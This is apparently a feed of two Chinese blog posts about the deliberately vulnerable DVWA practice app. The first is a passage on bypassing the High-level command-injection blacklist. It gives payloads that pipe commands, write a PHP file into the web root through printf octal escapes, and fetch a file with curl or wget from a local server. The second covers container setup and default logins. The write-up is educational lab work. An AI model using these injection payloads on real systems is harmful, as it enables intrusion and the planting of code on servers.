&lt;span class="c1">// Set blacklist
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$substitutions&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="s1">&amp;#39;&amp;amp;&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;;&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;| &amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;$&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;(&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;)&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;`&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;||&amp;#39;&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">);&lt;/span>
&lt;span class="c1">// Remove any of the charactars in the array (blacklist).
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">str_replace&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">array_keys&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$substitutions&lt;/span> &lt;span class="p">),&lt;/span> &lt;span class="nv">$substitutions&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="k">echo&lt;/span> &lt;span class="s1">&amp;#39;ping -c 4 &amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$target&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>结果是&lt;code>ping -c 4 notexists |echo 123&lt;/code>。看起来是 &lt;code>str_replace&lt;/code> 的用法有误，导致实际替换掉的是 &lt;code>|&lt;/code> 而不是 &lt;code>||&lt;/code>。&lt;/p>
&lt;p>php 官方文档（8.1）如是说：&lt;/p>
&lt;blockquote>
&lt;p>If &lt;code>search&lt;/code> and &lt;code>replace&lt;/code> are arrays, then &lt;strong>str_replace()&lt;/strong> takes a value from each array and uses them to search and replace on &lt;code>subject&lt;/code>. If &lt;code>replace&lt;/code> has fewer values than &lt;code>search&lt;/code>, then an empty string is used for the rest of replacement values. If &lt;code>search&lt;/code> is an array and &lt;code>replace&lt;/code> is a string, then this replacement string is used for every value of &lt;code>search&lt;/code>. The converse would not make sense, though.&lt;/p>
&lt;/blockquote>
&lt;p>DVWA 容器的 PHP 版本是 7.0 ，姑且当没变。那问题就在于 &lt;code>str_replace&lt;/code> 的替换方法了，我猜&amp;hellip;&amp;hellip;当 &lt;code>search&lt;/code> 是 &lt;code>array&lt;/code> 的时候，&lt;code>str_replace&lt;/code> 实际是这样干的：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="k">for&lt;/span> &lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">pattern&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="k">range&lt;/span> &lt;span class="nx">search&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">subject&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nf">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">pattern&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">subject&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>简单实验验证下。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">echo&lt;/span> &lt;span class="nx">str_replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;a&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;ab&amp;#34;&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="s2">&amp;#34;c&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;aabbcc&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// ccbbcc
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>但即使如此，也应该替换掉 &lt;code>||&lt;/code> 两个字符才对啊&amp;hellip;&lt;/p>
&lt;p>最后才发现，替换的模式是 &lt;code>| &lt;/code>（在&lt;code>|&lt;/code>后面多一个空格），所以只替换掉了 &lt;code>|| &lt;/code>的后一个 &lt;code>| &lt;/code>&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>事实证明视力还是很重要的，少打sc2，没瞎早该看到了。&lt;/p>
&lt;p>据此可以再改一改 payload，已知 &lt;code>||&lt;/code>会被替换成 &lt;code>|&lt;/code>，管道运算符会把上一个命令的输出接到下一个命令的 stdin 输入。正好，&lt;code>echo&lt;/code> 不读 stdin，直接&lt;code>echo '&amp;lt;?php phpinfo(); ?&amp;gt;' &amp;gt; /var/www/html/1.php&lt;/code> 的方法应该不受影响。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422160740919.png"
width="448"
height="143"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422160740919_hu5b9f61819af5c6eaa13b971071838e17_5816_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220422160740919_hu5b9f61819af5c6eaa13b971071838e17_5816_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220422160740919"
class="gallery-image"
data-flex-grow="313"
data-flex-basis="751px"
>&lt;/p>
&lt;p>倒是没报 404，可是白屏了。从 DVWA 的日志观察到下面的记录：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">[Fri Apr 22 08:07:20.601596 2022] [:error] [pid 312] [client 10.0.2.2:51105] PHP Notice: Use of undefined constant phpinfo - assumed &amp;#39;phpinfo&amp;#39; in /var/www/html/2.php on line 1
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这倒是很新鲜，&lt;code>phpinfo&lt;/code>不应该是全局的吗？&lt;/p>
&lt;blockquote>
&lt;p>我又傻逼了。&lt;/p>
&lt;/blockquote>
&lt;p>经过十几分钟的脑残式思考，忽然意识到 &lt;code>(&lt;/code> 和 &lt;code>)&lt;/code> 也在过滤清单里，哦淦！好吧，直接在这里注入 php 代码看来限制有点太多了，插个&lt;code>curl&lt;/code>命令让它下载得了。&lt;/p>
&lt;p>本地用 &lt;code>python3 -m http.server&lt;/code>命令启动一个 http 服务器，然后 &lt;code>ip addr show docker0&lt;/code> 看一眼本机 ip，把 payload 改成 &lt;code>notexists || curl http://172.17.0.1:8000/2.php -O /var/www/html/2.php&lt;/code> ，先找个 playground 试一试过滤后的命令是什么样。&lt;/p>
&lt;p>&lt;code>ping -c 4 notexists |curl http://172.17.0.1:8000/2.php O /var/www/html/2.php&lt;/code>&lt;/p>
&lt;p>发现 &lt;code>-&lt;/code> 也被过滤了，&lt;code>-O&lt;/code>参数不能用。想到看看 php 默认运行目录是哪里，直接 &lt;code>wget&lt;/code> 下载到当前目录也可以。然后又想到可以再拼一个 &lt;code>|| mv 2.php /var/www/html/2.php&lt;/code> 移动过去。再试一试。&lt;/p>
&lt;p>&lt;code>ping -c 4 notexists |wget http://172.17.0.1:8000/2.php |mv 2.php /var/www/html/2.php&lt;/code>&lt;/p>
&lt;p>现在看起来有机会运行了，结果报错&lt;code>wget: not found&lt;/code>。&lt;/p>
&lt;p>行吧。乖乖&lt;code>curl&lt;/code>，payload 改成 &lt;code>notexists || curl http://172.17.0.1:8000/2.php || tee /var/www/html/2.php&lt;/code>。更屑的事情发生了：&lt;code>curl: not found&lt;/code>。&lt;/p>
&lt;p>怎么什么都没有？沃日。拼一句 &lt;code>|| ls /usr/bin&lt;/code>看看有啥可以用的，惊喜地发现居然有个 &lt;code>rsync&lt;/code>，这下总该省事了吧，结果半天没搞出来匿名访问的 rsync daemon。&lt;/p>
&lt;p>一看时间快下班了，突然意识到其实有 &lt;code>base64&lt;/code> 可以用=。=，还有&lt;code>printf&lt;/code>转义&lt;code>\x&lt;/code> 都能bypass。怎么一到下班时间就才思泉涌。&lt;/p>
&lt;p>payload 改成 &lt;code>notexists || printf '&amp;lt;?php phpinfo\x28\x29\x3b ?&amp;gt;' &amp;gt; /var/www/html/2.php&lt;/code>，结果发现依然不行。为什么？头都要炸了。&lt;code>base64 -d&lt;/code>的&lt;code>-&lt;/code>会被过滤故不能考虑，&lt;code>printf&lt;/code>的&lt;code>\x&lt;/code>转义序列怎么会不行，谷歌了一番&lt;a class="link" href="https://stackoverflow.com/questions/66844155/bin-sh-does-not-recognize-hexadecimal-escape-sequences" target="_blank" rel="noopener"
>在爆栈看到个回答&lt;/a>：&lt;/p>
&lt;blockquote>
&lt;p>Because escape sequences in &lt;code>\xdd&lt;/code> form (where each &lt;code>d&lt;/code> represents a hexadecimal digit) are a GNU extension and not available everywhere. But octals are widely supported (and &lt;a class="link" href="https://pubs.opengroup.org/onlinepubs/9699919799/utilities/printf.html#tag_05" target="_blank" rel="noopener"
>standardized&lt;/a>), so you can use:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="nb">printf&lt;/span> &lt;span class="s1">&amp;#39;%b&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;\0220&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/blockquote>
&lt;p>好嘛，所以说 &lt;code>\x&lt;/code> 转义序列还不够 portable 是吧。&lt;code>\0&lt;/code>转义序列要用 8 进制编码，于是我再次改了一下 payload &amp;hellip;&lt;/p>
&lt;p>&lt;code>notexists|printf '&amp;lt;?php phpinfo\050\051\073 ?&amp;gt;' &amp;gt; /var/www/html/2.php&lt;/code>，把 &lt;code>\x&lt;/code> 转义序列改成了 &lt;code>\0&lt;/code>，这次没问题了。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220424142807468.png"
width="1268"
height="373"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220424142807468_hu3e708c4ffaea9e97136cc32ff74411e9_40468_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220424142807468_hu3e708c4ffaea9e97136cc32ff74411e9_40468_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220424142807468"
class="gallery-image"
data-flex-grow="339"
data-flex-basis="815px"
>&lt;/p>
&lt;p>此外还想到另一种解法，考虑&lt;code>sh&lt;/code>（&lt;code>csh&lt;/code>或者&lt;code>dash&lt;/code>，&lt;code>ash&lt;/code>？）不吃&lt;code>\x&lt;/code>，要是对&lt;code>\0&lt;/code>也不吃还有种比较狗的办法，&lt;code>printf &amp;quot;printf \&amp;quot;\\x28\\x29\&amp;quot;&amp;quot;|bash&lt;/code>，用&lt;code>\\&lt;/code>转义留下反斜杠，然后传给&lt;code>bash&lt;/code>执行。&lt;code>bash&lt;/code>大概率是能吃下&lt;code>\x&lt;/code>转义序列的，于是就间接实现了&lt;code>printf \x28\x29&lt;/code>。&lt;/p>
&lt;p>传&lt;code>notexists|printf &amp;quot;printf \&amp;quot;\\x28\&amp;quot;&amp;quot;|bash&lt;/code>这个 payload 可以看到回显 &lt;code>(&lt;/code>，说明这个思路是 ok 的。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220424143511245.png"
width="479"
height="121"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220424143511245_hu44e5cd97c663482ba2f8b28582fad915_4810_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-02/image-20220424143511245_hu44e5cd97c663482ba2f8b28582fad915_4810_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220424143511245"
class="gallery-image"
data-flex-grow="395"
data-flex-basis="950px"
>&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>Brute Force 比较简单，不提。&lt;/p>
&lt;p>Command Injection 其实一直到 High 难度都还是比较简单的，High 难度下留了&lt;code>|&lt;/code>管道符可以用，整个注入就没啥难度了。&lt;/p>
&lt;p>这就让我想到了怎么写 &lt;code>ping&lt;/code> 这个案例才能做到杜绝命令注入？&lt;/p>
&lt;p>&lt;code>\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}&lt;/code>正则匹配一下，感觉上面玩的那些花样就毫无意义了。&lt;/p>
&lt;p>Impossible 难度下 Command Injection 变成了这样&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php"> &lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_REQUEST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;ip&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="nv">$target&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">stripslashes&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Split the IP into 4 octects
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$octet&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">explode&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s2">&amp;#34;.&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Check IF each octet is an integer
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nx">is_numeric&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$octet&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nx">is_numeric&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$octet&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nx">is_numeric&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$octet&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nx">is_numeric&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$octet&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nx">sizeof&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$octet&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// If all 4 octets are int&amp;#39;s put the IP back together.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$octet&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;.&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$octet&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;.&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$octet&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;.&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$octet&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="c1">//...
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>我是有点难理解为什么还是用这种比较糙的手段验证=。=正则匹配下不行吗？&lt;code>is_numeric&lt;/code>是不是能 bypass 我不太肯定，但这条长长的&lt;code>if&lt;/code>看起来就感觉是有坑的样子&amp;hellip;&lt;/p>
&lt;p>所以吧&amp;hellip;到底多少还有点迷惑。Impossible 难度的命令注入，未来再研究研究，也许之后会再写篇博客看看。&lt;/p></description></item><item><title>DVWA上手记录-初体验</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-01/</link><pubDate>Thu, 21 Apr 2022 16:41:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-01/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>DVWA 全程 &lt;em>Damn Vunerable Web Application&lt;/em> ，是一个开源的基于 PHP+MariaDB 开发的漏洞靶场。&lt;/p>
&lt;p>官方文档推荐XAMPP部署，但个人比较爱docker，先拿 README 里写的 vulnerables/web-dvwa 玩玩看。&lt;/p>
&lt;blockquote>
&lt;p>vulnerable/web-dvwa 这个容器最后一次更新已经是 2015 年了，作为纯萌新姑且先把玩看看，安全领域攻防发展这么快，我寻思这个版本是有点和时代脱节了。&lt;/p>
&lt;/blockquote>
&lt;h2 id="安装">安装&lt;/h2>
&lt;p>启动个虚拟机，debian bullseye，装好 docker 再配好 zsh 之类的工具。tmux 开个分窗然后一键跑起来：&lt;code>docker run --rm -it -p 80:80 vulerables/web-dvwa&lt;/code>。&lt;/p>
&lt;p>配置下虚拟机端口转发，把 SSH 和 HTTP 转发到宿主机：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421144541945.png"
width="1138"
height="495"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421144541945_hu970c5e0efec5234184e9b858ab391e20_35007_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421144541945_hu970c5e0efec5234184e9b858ab391e20_35007_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421144541945"
class="gallery-image"
data-flex-grow="229"
data-flex-basis="551px"
>&lt;/p>
&lt;p>最后在浏览器打开 &lt;code>http://localhost:8080/&lt;/code> 就能看到登录页了。在创建数据库前随便输入什么用户名密码都能进去，简单读一下&lt;code>/setup.php&lt;/code> 上写的内容，点一下 &lt;code>Create/Reset database&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421151455045.png"
width="900"
height="906"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421151455045_hu5af901d3d9c5765cd7c0c540ee8e7236_94544_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421151455045_hu5af901d3d9c5765cd7c0c540ee8e7236_94544_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421151455045"
class="gallery-image"
data-flex-grow="99"
data-flex-basis="238px"
>&lt;/p>
&lt;p>等跳转回登录页，就算是完成了。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421151523317.png"
width="424"
height="437"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421151523317_hu59920bdd9bcb7bdd2dfa79f904f3464d_19156_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421151523317_hu59920bdd9bcb7bdd2dfa79f904f3464d_19156_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421151523317"
class="gallery-image"
data-flex-grow="97"
data-flex-basis="232px"
>&lt;/p>
&lt;p>默认账号密码是 &lt;code>admin&lt;/code> 和 &lt;code>password&lt;/code> 。&lt;/p>
&lt;h2 id="信息收集">信息收集&lt;/h2>
&lt;h3 id="介绍">介绍&lt;/h3>
&lt;p>在侧边栏可以看到可用的模块。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421152621120.png"
width="203"
height="616"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421152621120_hu9894033129233fb1163094cac0397a05_15927_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421152621120_hu9894033129233fb1163094cac0397a05_15927_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421152621120"
class="gallery-image"
data-flex-grow="32"
data-flex-basis="79px"
>&lt;/p>
&lt;p>具体内容稍后再看，先把主页上的信息读一读。&lt;/p>
&lt;p>介绍中这样说：&lt;/p>
&lt;blockquote>
&lt;p>It is up to the user how they approach DVWA. Either by working through every module at a fixed level, or selecting any module and working up to reach the highest level they can before moving onto the next one. There is not a fixed object to complete a module; however users should feel that they have successfully exploited the system as best as they possible could by using that particular vulnerability.&lt;/p>
&lt;/blockquote>
&lt;p>用户自己决定怎么玩这个靶场，没有固定目标。可以先把一个模块从低难度到高难度全打通再继续下一个，也可以低难度把所有模块打通再提高难度再来一轮。&lt;/p>
&lt;blockquote>
&lt;p>Please note, there are &lt;em>both documented and undocumented vulnerability&lt;/em> with this software. This is intentional. You are encouraged to try and discover as many issues as possible.&lt;/p>
&lt;/blockquote>
&lt;p>并且还提到有意存在未文档化的漏洞，也就是攻破一个模块的方法并不局限于帮助文档里的方法，完全可能自己挖掘出别的问题。&lt;/p>
&lt;blockquote>
&lt;p>DVWA also includes a Web Application Firewall (WAF), PHPIDS, which can be enabled at any stage to further increase the difficulty.&lt;/p>
&lt;/blockquote>
&lt;p>DVWA 还包含了 WAF，可以自己开启或者关闭。开启等于是给自己提高了难度。&lt;/p>
&lt;h3 id="php-info">PHP info&lt;/h3>
&lt;p>侧边栏下方有个 PHP Info 链接，点开看一眼，就是个经典的 phpinfo 页。&lt;/p>
&lt;p>php 版本是 7.0.30-0+deb9u1，应该是 debian 打包的版本。&lt;/p>
&lt;p>Apache 版本 2.4.25，Debian 打包的版本。&lt;/p>
&lt;p>其他半懂不懂的全部略，就当没看见。&lt;/p>
&lt;p>之后有需要再来看。&lt;/p>
&lt;h3 id="关于">关于&lt;/h3>
&lt;p>在 About 页里提到发行时间是 2015-10-08，确实很老了。&lt;/p>
&lt;p>里面还有些相关链接和资源、文档，把 dvwa 的官网主页加入收藏夹后剩下的内容暂且不管。&lt;/p>
&lt;h3 id="dvwa-security">DVWA security&lt;/h3>
&lt;p>安全配置页，显示当前的 DVWA 运行在哪个安全级别（就是前文介绍中提到的 &lt;strong>难度&lt;/strong>）。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421154901935.png"
width="904"
height="879"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421154901935_hu1e8ee6e0e7ee30ed3f4d3caa6e5f5d59_111848_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421154901935_hu1e8ee6e0e7ee30ed3f4d3caa6e5f5d59_111848_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421154901935"
class="gallery-image"
data-flex-grow="102"
data-flex-basis="246px"
>&lt;/p>
&lt;p>注意到页面这几个位置都有标注当前安全配置，在这个页面可以修改安全级别和 WAF （图中 PHPIDS）的开启状态。&lt;/p>
&lt;h3 id="setupreset-db">Setup/Reset DB&lt;/h3>
&lt;p>这个页面就是最初启动 DVWA 的时候初始化数据库的页面，可以在这个页面里重置数据库，也能在这个页面看到一些自检信息。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421155109454.png"
width="896"
height="918"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421155109454_hu8695d1d6b0b3980f08b0158e40b7c78e_108856_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421155109454_hu8695d1d6b0b3980f08b0158e40b7c78e_108856_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421155109454"
class="gallery-image"
data-flex-grow="97"
data-flex-basis="234px"
>&lt;/p>
&lt;p>&lt;code>allow_url_include&lt;/code>暂时不管，等玩到那个模块的时候再看情况。&lt;/p>
&lt;p>&lt;code>reCAPTCHA key&lt;/code> 是验证码模块需要的，等玩到的时候再找下怎么配。&lt;/p>
&lt;p>最下面的 &lt;code>Create / Reset Database&lt;/code> 的按钮就是重置数据库了。对于用 &lt;code>docker --rm&lt;/code> 启动的我来说直接重启下容器清理地更干净，预计不会怎么用到这个功能。&lt;/p>
&lt;h3 id="模块速览">模块速览&lt;/h3>
&lt;h4 id="brute-force">Brute Force&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421155923710.png"
width="909"
height="340"
